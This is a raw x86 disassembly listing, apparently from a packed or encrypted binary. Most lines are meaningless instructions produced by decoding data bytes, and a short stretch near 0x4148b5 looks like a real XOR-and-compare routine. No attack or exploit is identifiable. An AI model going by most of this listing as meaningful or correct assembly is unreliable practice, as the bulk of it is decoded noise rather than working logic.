  4145b4:	in     eax,0xb3
  4145b6:	aas    
  4145b7:	in     al,dx
  4145b8:	cli    
  4145b9:	leave  
  4145ba:	xchg   ecx,eax
  4145bb:	enter  0x6d68,0xe6
  4145bf:	sbb    bh,0xcf
  4145c2:	out    0x1c,al
  4145c4:	sub    bh,dl
  4145c6:	ins    DWORD PTR es:[edi],dx
  4145c7:	and    BYTE PTR [eax-0x4f],0xa6
  4145cb:	mov    dl,0xc4
  4145cd:	or     al,0x1d
  4145cf:	jnp    0x4145fb
  4145d1:	jmp    0x4145f6
  4145d3:	sahf   
  4145d4:	int3   
  4145d5:	jno    0x414570
  4145d7:	mov    al,ds:0xa85b5b40
  4145dc:	inc    edi
  4145dd:	inc    ebp
  4145de:	loope  0x414652
  4145e0:	lods   al,BYTE PTR ds:[esi]
  4145e1:	(bad)  
  4145e2:	mov    bl,0x68
  4145e4:	(bad)  
  4145e5:	jg     0x414603
  4145e7:	mov    esp,0xe3d3c65a
  4145ec:	xor    al,0x5c
  4145ee:	push   esi
  4145ef:	loope  0x4145a4
  4145f1:	jp     0x414616
  4145f3:	and    edx,DWORD PTR [ebx-0x4c]
  4145f6:	inc    ebp
  4145f7:	sbb    cl,BYTE PTR [ebx+0x44ca150d]
  4145fd:	sbb    al,0xe6
  4145ff:	mov    al,ds:0x66c8378c
  414604:	hlt    
  414605:	xor    bl,cl
  414607:	mov    bl,0xcc
  414609:	ss jns 0x4145d2
  41460c:	jb     0x4145d1
  41460e:	sub    al,0x4
  414610:	or     eax,0xab13d8d0
  414615:	rcl    esp,cl
  414617:	daa    
  414618:	inc    ebx
  414619:	cli    
  41461a:	dec    edx
  41461b:	call   0xffd31363
  414620:	test   DWORD PTR ds:0x21bba440,ecx
  414626:	ja     0x4145db
  414628:	push   edi
  414629:	test   eax,0x87594f9e
  41462e:	(bad)  
  41462f:	adc    BYTE PTR [edx-0x4e],bl
  414632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414633:	cmp    BYTE PTR [esi],ch
  414635:	pop    edx
  414636:	sbb    dl,al
  414638:	dec    esi
  414639:	add    DWORD PTR [ebx],ebp
  41463b:	into   
  41463c:	push   edi
  41463d:	lea    ecx,[eax+edi*8]
  414640:	mov    eax,ds:0x2f1043ba
  414645:	lods   eax,DWORD PTR ds:[esi]
  414646:	sbb    DWORD PTR ds:[edx-0x6c],0xffffffbf
  41464b:	sub    DWORD PTR [eax],eax
  41464d:	pop    es
  41464e:	cmc    
  41464f:	in     al,0x2a
  414651:	cmp    edx,DWORD PTR [edi+eiz*1]
  414654:	popf   
  414655:	dec    edx
  414656:	xchg   ecx,eax
  414657:	and    dh,0x17
  41465a:	pop    ebx
  41465b:	scas   eax,DWORD PTR es:[edi]
  41465c:	rol    DWORD PTR [edi],cl
  41465e:	mov    al,ds:0xe5e5027b
  414663:	ret    0xfdc1
  414666:	mov    esi,0x684b205a
  41466b:	mov    ch,0xcb
  41466d:	frstor [ecx+0x34]
  414670:	push   0xa7899cda
  414675:	outs   dx,BYTE PTR ds:[esi]
  414676:	je     0x4146c3
  414678:	rcr    BYTE PTR [ebx],0x36
  41467b:	(bad)  
  41467c:	push   ebp
  41467d:	xchg   edx,eax
  41467e:	dec    ebp
  41467f:	ins    DWORD PTR es:[edi],dx
  414680:	int3   
  414681:	popf   
  414682:	sub    al,0xb7
  414684:	xor    esp,ebx
  414686:	add    DWORD PTR [edx-0xa],esp
  414689:	sbb    cl,BYTE PTR [edi+0x5c49e9f3]
  41468f:	leave  
  414690:	test   BYTE PTR [edi],bl
  414692:	jecxz  0x41466a
  414694:	loop   0x4146af
  414696:	ret    0xe375
  414699:	repnz pop ecx
  41469b:	popf   
  41469c:	gs scas al,BYTE PTR es:[edi]
  41469e:	cmp    eax,0xf58ac746
  4146a3:	lock aas 
  4146a5:	imul   eax,DWORD PTR ds:0x213b7f5d,0xffffff8b
  4146ac:	sub    al,0x3
  4146ae:	test   al,0x15
  4146b0:	inc    ebx
  4146b1:	mov    ds:0x32f53bfa,eax
  4146b6:	inc    eax
  4146b7:	scas   eax,DWORD PTR es:[edi]
  4146b8:	jo     0x41466a
  4146ba:	lods   eax,DWORD PTR ds:[esi]
  4146bb:	aad    0x1d
  4146bd:	sub    eax,0x4a5a014d
  4146c2:	or     BYTE PTR [ebx],bh
  4146c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c5:	out    0xc9,al
  4146c7:	xchg   DWORD PTR [ebp-0x45db251f],esp
  4146cd:	(bad)  
  4146ce:	out    0x1f,al
  4146d0:	push   ss
  4146d1:	fcmovbe st,st(6)
  4146d3:	pop    ecx
  4146d4:	add    ecx,edi
  4146d6:	push   0xf324f2be
  4146db:	or     BYTE PTR [edi+edx*2],bl
  4146de:	jecxz  0x414744
  4146e0:	clc    
  4146e1:	xchg   edi,eax
  4146e2:	lods   al,BYTE PTR ds:[esi]
  4146e3:	leave  
  4146e4:	cmp    eax,0xc33e49e3
  4146e9:	repnz mov edx,0xf80f081d
  4146ef:	jo     0x41471f
  4146f1:	cmp    al,0x7d
  4146f3:	mov    eax,0x6a7fe3f2
  4146f8:	cmp    bl,BYTE PTR [edi]
  4146fa:	fimul  DWORD PTR [esp+ebx*4]
  4146fd:	jmp    0x589a6aab
  414702:	arpl   WORD PTR [ebp+ebp*8-0x5ae08347],dx
  414709:	and    DWORD PTR [edx-0x7a],edx
  41470c:	mov    ds:0xa4e4b21f,al
  414711:	rol    BYTE PTR ds:0xbd098c21,cl
  414717:	mov    esp,esi
  414719:	mov    esp,0x8e908f2b
  41471e:	gs ja  0xe8635c5c
  414725:	ins    DWORD PTR es:[edi],dx
  414726:	inc    eax
  414727:	mov    ebx,0x4fcf69de
  41472c:	xor    DWORD PTR [ecx+0x13d60eea],0x1f
  414733:	inc    edi
  414734:	sti    
  414735:	sub    eax,esp
  414737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414738:	jne    0x4146f8
  41473a:	jmp    0x41478e
  41473c:	call   0xb69b:0x4991f1b7
  414743:	fild   QWORD PTR ds:0xa3cedeb9
  414749:	xchg   esp,eax
  41474a:	push   cs
  41474b:	inc    ecx
  41474c:	std    
  41474d:	sahf   
  41474e:	out    dx,al
  41474f:	lods   eax,DWORD PTR ds:[esi]
  414750:	cmc    
  414751:	int3   
  414752:	aas    
  414753:	arpl   di,ax
  414755:	or     DWORD PTR [ebp-0x78],0x8785b228
  41475c:	or     eax,0x3d
  41475f:	int    0x1d
  414761:	(bad)  
  414762:	(bad)  [edi+0x7c3e7d24]
  414768:	xchg   edx,eax
  414769:	cmp    eax,0xc6b029ed
  41476e:	les    ebx,FWORD PTR [eax-0x73]
  414771:	pop    ss
  414772:	dec    eax
  414773:	das    
  414774:	and    al,0xe1
  414776:	push   es
  414777:	gs jne 0x414721
  41477a:	push   ebp
  41477b:	push   ebp
  41477c:	retf   0xb28f
  41477f:	add    al,0x70
  414781:	repnz adc ebx,DWORD PTR [ebp-0x2b]
  414785:	outs   dx,DWORD PTR ds:[esi]
  414786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414787:	mov    BYTE PTR [ebp-0x1f840c74],bh
  41478d:	push   eax
  41478e:	fdivr  DWORD PTR [edi+0x74]
  414791:	loop   0x4147d7
  414793:	shr    bl,1
  414795:	in     eax,0x52
  414797:	jnp    0x4147d6
  414799:	cmp    al,0x36
  41479b:	inc    edx
  41479c:	xchg   edi,eax
  41479d:	inc    ecx
  41479e:	icebp  
  41479f:	push   es
  4147a0:	or     DWORD PTR [ecx],0x62
  4147a3:	call   0x39d494f4
  4147a8:	int    0x4f
  4147aa:	inc    esp
  4147ab:	sahf   
  4147ac:	jbe    0x4147bd
  4147ae:	sar    DWORD PTR [edx],1
  4147b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b1:	jnp    0x4147d6
  4147b3:	sub    ah,BYTE PTR [ecx+eiz*2]
  4147b6:	(bad)  
  4147b7:	push   esp
  4147b8:	js     0x41482c
  4147ba:	lds    edx,FWORD PTR [edi+0x63a33691]
  4147c0:	ss scas eax,DWORD PTR es:[edi]
  4147c2:	and    dl,BYTE PTR [esi]
  4147c4:	jmp    0x414786
  4147c6:	int3   
  4147c7:	call   FWORD PTR [esi]
  4147c9:	push   ds
  4147ca:	adc    eax,0xad2ac539
  4147cf:	clc    
  4147d0:	neg    edx
  4147d2:	(bad)  
  4147d3:	push   ecx
  4147d4:	and    eax,0x8e0dd5d3
  4147d9:	mov    dl,0x47
  4147db:	into   
  4147dc:	xchg   edx,eax
  4147dd:	inc    ecx
  4147de:	int3   
  4147df:	outs   dx,BYTE PTR ds:[esi]
  4147e0:	sub    al,0x2f
  4147e2:	lahf   
  4147e3:	rol    BYTE PTR [edi],cl
  4147e5:	lahf   
  4147e6:	mov    edi,0x5785a54a
  4147eb:	inc    esp
  4147ec:	push   esi
  4147ed:	addr16 adc ebp,edi
  4147f0:	ror    DWORD PTR [ecx-0x773aa888],1
  4147f6:	dec    edi
  4147f7:	mov    ebx,0x687726f3
  4147fc:	hlt    
  4147fd:	add    BYTE PTR [ebp+0x6a],al
  414800:	mov    ch,0xf6
  414802:	fstp   QWORD PTR [esi+0x27d34fe5]
  414808:	pushf  
  414809:	nop
  41480a:	xchg   esp,eax
  41480b:	push   eax
  41480c:	cmp    al,0x9f
  41480e:	xchg   edi,eax
  41480f:	push   cs
  414810:	int3   
  414811:	das    
  414812:	push   0x26
  414814:	stos   BYTE PTR es:[edi],al
  414815:	xchg   esp,eax
  414816:	scas   al,BYTE PTR es:[edi]
  414817:	lds    ecx,FWORD PTR [edi-0x3b]
  41481a:	inc    esp
  41481b:	or     eax,0xbdd678de
  414820:	add    eax,0x1c68377e
  414825:	sbb    DWORD PTR [esi],esi
  414827:	mov    ebx,0x393765cb
  41482c:	and    eax,0xb2d04b64
  414831:	iret   
  414832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414833:	sub    DWORD PTR [ebp-0x4d],0x5d
  414837:	inc    ecx
  414838:	xor    edx,DWORD PTR [esi]
  41483a:	sub    eax,0x86318cd
  41483f:	leave  
  414840:	fldcw  WORD PTR [edx-0x55]
  414843:	pushf  
  414844:	dec    ebx
  414845:	and    al,0x42
  414847:	pop    esi
  414848:	in     al,0x9f
  41484a:	mov    cl,dl
  41484c:	loopne 0x414887
  41484e:	popa   
  41484f:	jl     0x41482b
  414851:	fsub   DWORD PTR [esp+ebx*2]
  414854:	pop    ebx
  414855:	xor    eax,0xe4081415
  41485a:	jmp    0xf77a:0xed6ba6d9
  414861:	test   eax,0x50326a1d
  414866:	pushf  
  414867:	inc    ebx
  414868:	inc    ebp
  414869:	fstp   TBYTE PTR [ebp+0xd]
  41486c:	fimul  WORD PTR [bx+di-0x81]
  414871:	cmp    BYTE PTR [esi+0x640cb742],al
  414877:	sbb    DWORD PTR [ebx+0x2e18e7d0],0x3a398389
  414881:	jle    0x41483f
  414883:	ds popf 
  414885:	dec    ebp
  414886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414887:	mov    eax,0x39da90f6
  41488c:	mov    ebp,0x7aa5314e
  414891:	out    dx,eax
  414892:	ds scas al,BYTE PTR es:[edi]
  414894:	push   edi
  414895:	cli    
  414896:	lods   eax,DWORD PTR ds:[esi]
  414897:	aaa    
  414898:	outs   dx,DWORD PTR ds:[esi]
  414899:	inc    ebx
  41489a:	mov    eax,0xd6f7993d
  41489f:	xchg   esp,eax
  4148a0:	neg    BYTE PTR [edi+0x79]
  4148a3:	js     0x4148ec
  4148a5:	and    edi,DWORD PTR [ecx+0x5e]
  4148a8:	mov    esi,0xad0d9cff
  4148ad:	enter  0xc527,0xf7
  4148b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b2:	xor    dh,bl
  4148b4:	inc    ecx
  4148b5:	mov    edx,DWORD PTR [ebp+0x8]
  4148b8:	xor    edx,eax
  4148ba:	add    edx,esi
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0xf1add379
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx-0x4a8f03b8],0x6
  414952:	and    BYTE PTR [ebx+0x2f19622f],bh
  414958:	jne    0x414986
  41495a:	pop    ebx
  41495b:	mov    WORD PTR [ecx+0x1f],gs
  41495e:	popf   
  41495f:	mov    ebp,0xad199550
  414965:	(bad)  
  414966:	xchg   ebx,eax
  414967:	fcom   QWORD PTR [esi-0x3a]
  41496a:	xchg   BYTE PTR [esi-0x63],bh
  41496d:	ja     0x414927
  41496f:	jno    0x414921
  414971:	adc    al,0xd
  414973:	test   eax,0x4aba177
  414978:	lahf   
  414979:	ja     0x4149e1
  41497b:	shl    DWORD PTR ds:0x33574591,1
  414981:	outs   dx,BYTE PTR ds:[esi]
  414982:	pop    ebp
  414983:	add    al,0x25
  414985:	xor    BYTE PTR [ebx+0x7b],al
  414988:	int3   
  414989:	aad    0xc1
  41498b:	sbb    DWORD PTR [eax],ebx
  41498d:	repz mov esp,0x413af231
  414993:	mov    al,dh
  414995:	sub    bh,BYTE PTR [eax-0x57023db4]
  41499b:	jmp    0x41498b
  41499d:	mov    DWORD PTR [esi],ecx
  41499f:	dec    esp
  4149a0:	je     0x414949
  4149a2:	sahf   
  4149a3:	push   esp
  4149a4:	popa   
  4149a5:	mov    cl,0x1f
  4149a7:	frstor [ecx+ebp*2-0x41]
  4149ab:	addr16 imul bh
  4149ae:	sub    DWORD PTR [eax-0x66c7d8d5],ecx
  4149b4:	in     eax,0x9f
  4149b6:	push   ecx
  4149b7:	das    
  4149b8:	xchg   esi,eax
  4149b9:	neg    edi
  4149bb:	jmp    0xb3e1:0x51a0437f
  4149c2:	mov    esp,0xc11d3103
  4149c7:	stc    
  4149c8:	dec    esp
  4149c9:	pusha  
  4149ca:	or     BYTE PTR [eax+esi*8],bh
  4149cd:	jno    0x414a4e
  4149cf:	in     al,dx
  4149d0:	xchg   BYTE PTR [ecx],ah
  4149d2:	add    al,0x3e
  4149d4:	in     eax,0x31
  4149d6:	arpl   WORD PTR [eax-0x13],ax
  4149d9:	and    eax,0xfa2c6a0
  4149de:	add    bl,BYTE PTR [edi-0x3]
  4149e1:	fsubr  QWORD PTR [eax-0x7d939f87]
  4149e7:	add    eax,DWORD PTR [ebx+0x334d6a5e]
  4149ed:	cwde   
  4149ee:	test   DWORD PTR [edx-0x54],esp
  4149f1:	inc    ebx
  4149f2:	push   0x73
  4149f4:	out    0xb2,al
  4149f6:	mov    ah,0x0
  4149f8:	or     bh,BYTE PTR [eax-0x7e]
  4149fb:	pop    es
  4149fc:	lods   al,BYTE PTR ds:[esi]
  4149fd:	enter  0xf30c,0xcc
  414a01:	lea    edx,[ecx+0x3aad4e67]
  414a07:	adc    DWORD PTR [eax],ebx
  414a09:	inc    esp
  414a0a:	cmp    esi,edx
  414a0c:	push   ebp
  414a0d:	xor    bl,BYTE PTR [esi]
  414a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a10:	or     BYTE PTR [edx+0x64],ch
  414a13:	sti    
  414a14:	or     eax,0x342ceaeb
  414a19:	pop    ebp
  414a1a:	(bad)  
  414a1b:	sbb    eax,0xb11e3fc3
  414a20:	mov    DWORD PTR [eax+ecx*2+0x14],edx
  414a24:	pop    DWORD PTR ss:[esi+0x3599b393]
  414a2b:	daa    
  414a2c:	dec    eax
  414a2d:	mov    esp,0xc35998f4
  414a32:	xor    DWORD PTR [edx-0x7f],ebp
  414a35:	inc    DWORD PTR [edx]
  414a37:	fist   DWORD PTR [edi]
  414a39:	aam    0xde
  414a3b:	loopne 0x4149d0
  414a3d:	mov    ds:0x7bec1837,al
  414a42:	repz mov ch,0x1a
  414a45:	xor    ebp,0xffffffb9
  414a48:	push   esp
  414a49:	fmul   DWORD PTR [edi-0x3afad203]
  414a4f:	nop
  414a50:	xlat   BYTE PTR ds:[ebx]
  414a51:	add    ah,ah
  414a53:	sti    
  414a54:	scas   eax,DWORD PTR es:[edi]
  414a55:	and    esi,DWORD PTR [edi]
  414a57:	add    dh,dl
  414a59:	rol    BYTE PTR [ebx+0x3f],1
  414a5c:	inc    esi
  414a5d:	pop    ds
  414a5e:	das    
  414a5f:	push   ss
  414a60:	aad    0x11
  414a62:	popa   
  414a63:	jle    0x414a0d
  414a65:	call   0x3bf0:0x11e64f01
  414a6c:	hlt    
  414a6d:	(bad)  
  414a6e:	jmp    0x414a4b
  414a70:	cli    
  414a71:	dec    edi
  414a72:	mov    ch,0x57
  414a74:	aaa    
  414a75:	mov    eax,0xbe18a0e
  414a7a:	sysexit 
  414a7c:	add    DWORD PTR [esi+eiz*1],ebx
  414a7f:	pop    esi
  414a80:	inc    BYTE PTR ds:0x5fce3480
  414a86:	retf   
  414a87:	or     eax,0x5becce1a
  414a8c:	test   BYTE PTR [edx-0xe],bh
  414a8f:	lea    eax,[edx+0x12]
  414a92:	lods   eax,DWORD PTR ds:[esi]
  414a93:	jns    0x414a4e
  414a95:	inc    edi
  414a96:	jl     0x414a70
  414a98:	sbb    eax,0x672746af
  414a9d:	sbb    al,0xfd
  414a9f:	fisttp WORD PTR [edi]
  414aa1:	ins    BYTE PTR es:[edi],dx
  414aa2:	xchg   BYTE PTR [eax],bh
  414aa4:	mov    dh,0xe3
  414aa6:	pop    edx
  414aa7:	mov    ebp,0x2d4cab71
  414aac:	pusha  
  414aad:	jno    0x414ae3
  414aaf:	xor    DWORD PTR [ecx+0x2],esi
  414ab2:	cwde   
  414ab3:	cmp    DWORD PTR ds:0x4e685aca,eax
  414ab9:	xor    BYTE PTR [esi-0x707b5506],bl
  414abf:	mov    DWORD PTR [edi-0x68],edx
  414ac2:	es in  eax,0xc1
  414ac5:	sbb    esp,DWORD PTR [edi]
  414ac7:	das    
  414ac8:	mov    al,ds:0xf4448ea2
  414acd:	pusha  
  414ace:	mov    ecx,0xa7d45d1
  414ad3:	xor    al,0x22
  414ad5:	fstp   TBYTE PTR [ecx+0x11]
  414ad8:	les    esp,FWORD PTR [ebx+0x30]
  414adb:	fidiv  DWORD PTR [ebx]
  414add:	mov    ds:0xf523e1eb,al
  414ae2:	mov    DWORD PTR [edi],eax
  414ae4:	daa    
  414ae5:	test   bh,ch
  414ae7:	mov    ecx,0xb5559fb8
  414aec:	cmp    edx,edx
  414aee:	int3   
  414aef:	jg     0x414b1c
  414af1:	xor    eax,0xeadc485a
  414af6:	test   DWORD PTR [edi-0x5a30966c],esi
  414afc:	xor    DWORD PTR [ebp+esi*8-0x131c635f],ecx
  414b03:	or     DWORD PTR [esp+eax*4-0x6a74fa7],edx
  414b0a:	xchg   ebx,eax
  414b0b:	mov    dl,0xe9
  414b0d:	outs   dx,DWORD PTR ds:[esi]
  414b0e:	mov    edi,0x1a799b2d
  414b13:	xlat   BYTE PTR ds:[ebx]
  414b14:	jbe    0x414ac7
  414b16:	int    0xfc
  414b18:	mov    bh,0xd7
  414b1a:	pop    ss
  414b1b:	(bad)  
  414b1c:	mov    ebx,0xe5324f5e
  414b21:	sub    al,0x82
  414b24:	rcl    BYTE PTR [edx+0x725d0b48],cl
  414b2a:	dec    edx
  414b2b:	jg     0x414af9
  414b2d:	fwait
  414b2e:	jae    0x414af0
  414b30:	sar    ch,1
  414b32:	dec    edi
  414b33:	ret    
  414b34:	ins    DWORD PTR es:[edi],dx
  414b35:	mov    bh,0x46
  414b37:	frstor [ebx]
  414b39:	jns    0x414b30
  414b3b:	sbb    ecx,edx
  414b3d:	mov    edi,0xc3ef28e0
  414b42:	inc    edx
  414b43:	push   ebx
  414b44:	mov    ah,0xbe
  414b46:	daa    
  414b47:	test   DWORD PTR [bx-0x4492],0xc9e74de7
  414b50:	adc    ah,BYTE PTR [ecx-0x60a01ae]
  414b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b57:	sahf   
  414b58:	ja     0x414b10
  414b5a:	jnp    0x414ae5
  414b5c:	dec    ecx
  414b5d:	xor    BYTE PTR [ecx-0x24453879],bh
  414b63:	gs jns 0x414b24
  414b66:	add    ebx,eax
  414b68:	ss mov al,es:0xcf4b5d3f
  414b6f:	jl     0x414bce
  414b71:	push   edx
  414b72:	cmp    edi,0x8f382af7
  414b78:	in     al,dx
  414b79:	leave  
  414b7a:	add    dl,BYTE PTR es:[edx]
  414b7d:	stc    
  414b7e:	dec    ecx
  414b7f:	pop    ss
  414b80:	dec    esi
  414b81:	div    DWORD PTR [ecx+ecx*4+0x5ea396a0]
  414b88:	pushf  
  414b89:	xchg   edi,eax
  414b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b8b:	and    DWORD PTR es:[ecx+ebx*8],esi
  414b8f:	push   ebx
  414b90:	or     ebx,DWORD PTR [ecx+0x68]
  414b93:	test   DWORD PTR [eax+0x2f],ebp
  414b96:	inc    esi
  414b97:	inc    ebx
  414b98:	mov    ds:0x531cbc71,al
  414b9d:	fbstp  TBYTE PTR [edi+0x343e9f3]
  414ba3:	sub    dl,BYTE PTR [ecx]
  414ba5:	fimul  DWORD PTR [ebp-0x617ef102]
  414bab:	loop   0x414b57
  414bad:	push   0x3a145990
  414bb2:	fs cmp dl,dl
  414bb5:	add    BYTE PTR [ecx],0x75
  414bb8:	jge    0x414b9c
  414bba:	outs   dx,DWORD PTR ds:[esi]
  414bbb:	inc    ecx
  414bbc:	ret    
  414bbd:	jbe    0x414c1f
  414bbf:	mov    ss,WORD PTR [edx-0x4e236f9f]
  414bc5:	jne    0x414c05
  414bc7:	jmp    0x414c10
  414bc9:	sub    al,0xc9
  414bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bcc:	sbb    edi,DWORD PTR [esi]
  414bce:	int3   
  414bcf:	jecxz  0x414bce
  414bd1:	into   
  414bd2:	pop    ss
  414bd3:	mov    dh,0xd6
  414bd5:	fwait
  414bd6:	cmp    BYTE PTR [ebx],dl
  414bd8:	adc    eax,0x62e15a83
  414bdd:	dec    esi
  414bde:	loop   0x414bdf
  414be0:	dec    ecx
  414be1:	cli    
  414be2:	cmp    DWORD PTR [ecx+0x64],edi
  414be5:	pop    ebp
  414be6:	je     0x414c46
  414be8:	shl    bl,1
  414bea:	fstp   TBYTE PTR [ecx-0x27]
  414bed:	pop    ebp
  414bee:	push   ecx
  414bef:	arpl   bx,di
  414bf1:	adc    bl,BYTE PTR [ebp-0x2b345685]
  414bf7:	ror    BYTE PTR [eax],cl
  414bf9:	xchg   esi,eax
  414bfa:	sbb    al,0x99
  414bfc:	sub    BYTE PTR [edx+0x4f53cba0],ah
  414c02:	mov    DWORD PTR [edi+0x40],ecx
  414c05:	fstp   DWORD PTR [eax]
  414c07:	ins    DWORD PTR es:[edi],dx
  414c08:	loope  0x414bf1
  414c0a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0c:	sub    dh,al
  414c0e:	int    0xf
  414c10:	and    ch,al
  414c12:	inc    eax
  414c13:	jle    0x414c31
  414c15:	sti    
  414c16:	add    al,0x41
  414c18:	fld    DWORD PTR [ebx]
  414c1a:	(bad)  
  414c1b:	lea    esi,[ecx-0x614fbee8]
  414c21:	fs xchg esp,eax
  414c23:	aaa    
  414c24:	cmp    edx,DWORD PTR [ebx-0x54]
  414c27:	js     0x414bc4
  414c29:	das    
  414c2a:	and    al,0xe8
  414c2c:	mov    ch,0xbb
  414c2e:	icebp  
  414c2f:	add    eax,edx
  414c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c32:	sbb    cl,BYTE PTR [ebx+edx*2]
  414c35:	jbe    0x414bee
  414c37:	imul   ecx,DWORD PTR [eax-0x29],0x70d39ef3
  414c3e:	adc    DWORD PTR ds:0xb53aec4a,edi
  414c44:	retf   
  414c45:	xchg   esi,eax
  414c46:	mov    edi,0xb16b252d
  414c4b:	sub    DWORD PTR [ebx],0xffffff89
  414c4e:	push   ebp
  414c4f:	xchg   esi,eax
  414c50:	inc    esp
  414c51:	jae    0x414be3
  414c53:	scas   al,BYTE PTR es:[edi]
  414c54:	int    0xc1
  414c56:	mov    ds:0xc58ba488,eax
  414c5b:	dec    ebp
  414c5c:	leave  
  414c5d:	popf   
  414c5e:	xchg   edx,eax
  414c5f:	adc    DWORD PTR [ebx+0x41],esi
  414c62:	xor    edx,DWORD PTR [ebx-0x22]
  414c65:	sub    esi,ebp
  414c67:	xor    bh,ch
  414c69:	repz cmp al,0xcb
  414c6d:	fldcw  WORD PTR [edx+0x4a]
  414c70:	jno    0x414c6c
  414c72:	outs   dx,BYTE PTR ds:[esi]
  414c73:	iret   
  414c74:	bound  esp,QWORD PTR [ebx+0x54]
  414c77:	in     eax,0xb
  414c79:	push   ebx
  414c7a:	inc    edi
  414c7b:	iret   
  414c7c:	out    0x3f,eax
  414c7e:	sub    cl,BYTE PTR [edi+0x4]
  414c81:	pop    DWORD PTR [eax]
  414c83:	xchg   esi,eax
  414c84:	or     dl,BYTE PTR [ecx+0x45]
  414c87:	gs mov dl,0xdf
  414c8a:	rol    DWORD PTR [eax],1
  414c8c:	sub    al,0xd5
  414c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c8f:	inc    edi
  414c90:	and    dl,BYTE PTR [edx]
  414c92:	pop    ss
  414c93:	(bad)  
  414c95:	add    ebx,DWORD PTR [edi+ecx*8-0x20]
  414c99:	mov    bl,0x3c
  414c9b:	jno    0x414c6f
  414c9d:	aam    0x48
  414c9f:	icebp  
  414ca0:	xor    DWORD PTR [eax+0x2b],ebx
  414ca3:	aaa    
  414ca4:	and    dh,0xb7
  414ca7:	test   al,0x47
  414ca9:	mov    edx,DWORD PTR [eax+0x54723603]
  414caf:	(bad)  
  414cb0:	aad    0xe7
  414cb2:	outs   dx,DWORD PTR ds:[esi]
  414cb3:	shl    DWORD PTR ds:0x616fffa0,1
  414cb9:	pop    ecx
  414cba:	stos   BYTE PTR es:[edi],al
  414cbb:	call   0xbecca63e
  414cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc1:	in     al,0x41
  414cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cc4:	dec    esp
  414cc5:	pop    esi
  414cc6:	retf   
  414cc7:	dec    eax
  414cc8:	xor    DWORD PTR [ebp+esi*1+0x45d1f297],esi
  414ccf:	adc    dh,BYTE PTR [ebx-0x80]
  414cd2:	idiv   BYTE PTR [ebx]
  414cd4:	or     BYTE PTR [ecx-0x686bf72d],0x6e
  414cdb:	lods   al,BYTE PTR ds:[esi]
  414cdc:	sub    DWORD PTR [eax+0x20fbac94],0x77
  414ce3:	loope  0x414caa
  414ce5:	mov    bh,0x4c
  414ce7:	sub    ah,BYTE PTR [ebx+0x39]
  414cea:	addr16 xchg esp,eax
  414cec:	mov    al,0xe7
  414cee:	mov    dh,0x10
  414cf0:	das    
  414cf1:	into   
  414cf2:	outs   dx,DWORD PTR ds:[esi]
  414cf3:	xchg   DWORD PTR [esi+0x60],ebp
  414cf6:	sub    BYTE PTR [edx-0x3e],0x84
  414cfa:	scas   eax,DWORD PTR es:[edi]
  414cfb:	xor    bl,BYTE PTR [edx-0x1f]
  414cfe:	stos   DWORD PTR es:[edi],eax
  414cff:	push   ds
  414d00:	lahf   
  414d01:	cmp    al,BYTE PTR [esi-0x2a7e9669]
  414d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d08:	bound  eax,QWORD PTR [ecx-0x3e]
  414d0b:	push   es
  414d0c:	in     eax,dx
  414d0d:	in     al,dx
  414d0e:	mov    DWORD PTR [ebx],ebp
  414d10:	mov    DWORD PTR [ecx-0x28],ebp
  414d13:	(bad)  
  414d14:	aad    0xf2
  414d16:	leave  
  414d17:	hlt    
  414d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d19:	imul   esp,DWORD PTR [edi-0x9],0xffffffaf
  414d1d:	adc    eax,0x6f863d4b
  414d22:	test   DWORD PTR [eax+0xe],0xe54f1595
  414d29:	xchg   ecx,eax
  414d2a:	clc    
  414d2b:	adc    DWORD PTR [eax+0x55],ecx
  414d2e:	aaa    
